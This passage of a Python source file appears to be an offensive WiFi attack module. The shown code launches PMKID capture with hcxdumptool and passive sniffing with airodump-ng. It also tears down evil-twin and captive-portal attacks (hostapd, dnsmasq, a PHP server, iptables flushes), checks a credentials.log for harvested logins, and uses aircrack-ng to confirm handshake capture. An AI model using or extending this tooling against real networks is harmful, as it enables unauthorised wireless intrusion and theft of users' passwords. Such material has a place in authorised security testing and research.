                    "-o", output_file,
                    "--enable_status=1",
                    "--filterlist_ap=" + ap_bssid,
                    "--filtermode=2",
                    "--disable_deauthentication=1"
                ]
                
                hcxdumptool_process = subprocess.Popen(
                    hcxdumptool_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Wait for hcxdumptool to start
                time.sleep(2)
                
                # Check if hcxdumptool is running
                if hcxdumptool_process.poll() is not None:
                    stderr = hcxdumptool_process.stderr.read().decode('utf-8')
                    logging.error(f"Failed to start hcxdumptool: {stderr}")
                    return False
                
                # Store attack status
                self.attack_status = {
                    "type": AttackType.PMKID_ATTACK.value,
                    "ap_bssid": ap_bssid,
                    "channel": channel,
                    "ssid": ssid,
                    "output_file": output_file,
                    "hcxdumptool_process": hcxdumptool_process
                }
                
                logging.info(f"PMKID attack for AP {ap_bssid} started successfully")
                return True
            except Exception as e:
                logging.error(f"Error starting PMKID attack: {e}")
                return False
    
    def start_passive_monitor(self, channel: int = None) -> bool:
        """Start passive monitoring of WiFi traffic.
        
        Args:
            channel: WiFi channel to monitor (None for all channels)
            
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            # Stop any running attacks
            self.stop_attack()
            
            # Enable monitor mode
            if not self._enable_monitor_mode():
                logging.error("Failed to enable monitor mode for passive monitoring")
                return False
            
            try:
                # Create output directory
                capture_dir = os.path.join(self.capture_dir, "passive")
                os.makedirs(capture_dir, exist_ok=True)
                
                # Generate output filename
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                output_prefix = os.path.join(capture_dir, f"passive_{timestamp}")
                
                # Start airodump-ng for passive monitoring
                logging.info(f"Starting passive monitoring{' on channel ' + str(channel) if channel else ''}")
                airodump_cmd = [
                    "airodump-ng",
                    "--write", output_prefix,
                    "--output-format", "pcap,csv"
                ]
                
                if channel:
                    airodump_cmd.extend(["--channel", str(channel)])
                
                airodump_cmd.append(self.monitor_interface.name)
                
                airodump_process = subprocess.Popen(
                    airodump_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # Wait for airodump to start
                time.sleep(2)
                
                # Store attack status
                self.attack_status = {
                    "type": AttackType.PASSIVE_MONITOR.value,
                    "channel": channel,
                    "output_prefix": output_prefix,
                    "airodump_process": airodump_process
                }
                
                logging.info("Passive monitoring started successfully")
                return True
            except Exception as e:
                logging.error(f"Error starting passive monitoring: {e}")
                return False
    
    def stop_attack(self) -> bool:
        """Stop any running attack.
        
        Returns:
            True if successful, False otherwise
        """
        with self.lock:
            if not self.attack_status:
                logging.info("No attack running")
                return True
            
            try:
                attack_type = self.attack_status.get("type")
                logging.info(f"Stopping {attack_type} attack")
                
                # Stop processes based on attack type
                if attack_type == AttackType.EVIL_TWIN.value:
                    # Stop hostapd
                    process = self.attack_status.get("process")
                    if process:
                        process.terminate()
                        process.wait(timeout=5)
                    
                    # Remove configuration file
                    conf_file = self.attack_status.get("conf_file")
                    if conf_file and os.path.exists(conf_file):
                        os.unlink(conf_file)
                
                elif attack_type == AttackType.CAPTIVE_PORTAL.value:
                    # Stop hostapd
                    hostapd_process = self.attack_status.get("hostapd_process")
                    if hostapd_process:
                        hostapd_process.terminate()
                        hostapd_process.wait(timeout=5)
                    
                    # Stop dnsmasq
                    dnsmasq_process = self.attack_status.get("dnsmasq_process")
                    if dnsmasq_process:
                        dnsmasq_process.terminate()
                        dnsmasq_process.wait(timeout=5)
                    
                    # Stop PHP server
                    php_process = self.attack_status.get("php_process")
                    if php_process:
                        php_process.terminate()
                        php_process.wait(timeout=5)
                    
                    # Remove configuration files
                    hostapd_conf_file = self.attack_status.get("hostapd_conf_file")
                    if hostapd_conf_file and os.path.exists(hostapd_conf_file):
                        os.unlink(hostapd_conf_file)
                    
                    dnsmasq_conf_file = self.attack_status.get("dnsmasq_conf_file")
                    if dnsmasq_conf_file and os.path.exists(dnsmasq_conf_file):
                        os.unlink(dnsmasq_conf_file)
                    
                    # Reset iptables
                    subprocess.run(["iptables", "-F"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    
                    # Disable IP forwarding
                    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                elif attack_type in [AttackType.HANDSHAKE_CAPTURE.value, AttackType.PASSIVE_MONITOR.value]:
                    # Stop airodump-ng
                    airodump_process = self.attack_status.get("airodump_process")
                    if airodump_process:
                        airodump_process.terminate()
                        airodump_process.wait(timeout=5)
                
                elif attack_type == AttackType.PMKID_ATTACK.value:
                    # Stop hcxdumptool
                    hcxdumptool_process = self.attack_status.get("hcxdumptool_process")
                    if hcxdumptool_process:
                        hcxdumptool_process.terminate()
                        hcxdumptool_process.wait(timeout=5)
                
                # Clear attack status
                self.attack_status = {}
                
                logging.info("Attack stopped successfully")
                return True
            except Exception as e:
                logging.error(f"Error stopping attack: {e}")
                return False
    
    def get_attack_status(self) -> Dict[str, Any]:
        """Get the status of the current attack.
        
        Returns:
            Dictionary with attack status information
        """
        with self.lock:
            if not self.attack_status:
                return {"running": False}
            
            # Create a copy of the attack status without process objects
            status = {k: v for k, v in self.attack_status.items() if not k.endswith("_process")}
            status["running"] = True
            
            # Add additional status information based on attack type
            attack_type = status.get("type")
            
            if attack_type == AttackType.CAPTIVE_PORTAL.value:
                # Check for captured credentials
                portal_dir = status.get("portal_dir")
                if portal_dir:
                    creds_file = os.path.join(portal_dir, "credentials.log")
                    if os.path.exists(creds_file):
                        try:
                            with open(creds_file, 'r') as f:
                                creds = f.read()
                            status["credentials_captured"] = len(creds.strip()) > 0
                        except:
                            status["credentials_captured"] = False
            
            elif attack_type == AttackType.HANDSHAKE_CAPTURE.value:
                # Check for captured handshakes
                output_prefix = status.get("output_prefix")
                if output_prefix:
                    pcap_file = f"{output_prefix}-01.cap"
                    if os.path.exists(pcap_file):
                        # Check if handshake is captured using aircrack-ng
                        try:
                            aircrack_output = subprocess.check_output(
                                ["aircrack-ng", pcap_file],
                                stderr=subprocess.STDOUT
                            ).decode('utf-8')
                            status["handshake_captured"] = "handshake" in aircrack_output.lower()
                        except:
                            status["handshake_captured"] = False
            
            elif attack_type == AttackType.PMKID_ATTACK.value:
                # Check for captured PMKID
                output_file = status.get("output_file")
                if output_file and os.path.exists(output_file):
                    # Check file size to see if data was captured
                    file_size = os.path.getsize(output_file)
                    status["file_size"] = file_size
                    status["pmkid_captured"] = file_size > 24  # Minimum size for a valid capture
            
            return status
    
    def cleanup(self) -> None:
        """Clean up resources and restore normal operation."""
        with self.lock:
            # Stop any running attacks
            self.stop_attack()
            
            # Stop continuous scan if running
            if self.scan_thread and self.scan_thread.is_alive():
                self.stop_continuous_scan()
            
            # Disable monitor mode
            self._disable_monitor_mode()
            
            logging.info("WiFi attack module cleaned up")


# Example usage
if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    try:
        # Initialize WiFi attack module
        wifi_attack = WiFiAttack()
        
        # Scan for networks
        networks = wifi_attack.scan_networks(duration=10)
        
        # Print scan results
        print(f"Found {len(networks)} access points:")
        for bssid, ap in networks.items():
            print(f"SSID: {ap.ssid}, BSSID: {ap.bssid}, Channel: {ap.channel}, Encryption: {ap.encryption}, Signal: {ap.signal}")
            if ap.clients:
                print(f"  Clients: {len(ap.clients)}")
                for client_mac in ap.clients:
                    client = wifi_attack.clients.get(client_mac)
                    if client:
                        print(f"    MAC: {client.mac}, Signal: {client.signal}")
        
        # Clean up
        wifi_attack.cleanup()
        
        logging.info("WiFi attack module test completed successfully")
    except Exception as e:
        logging.error(f"WiFi attack module test failed: {e}")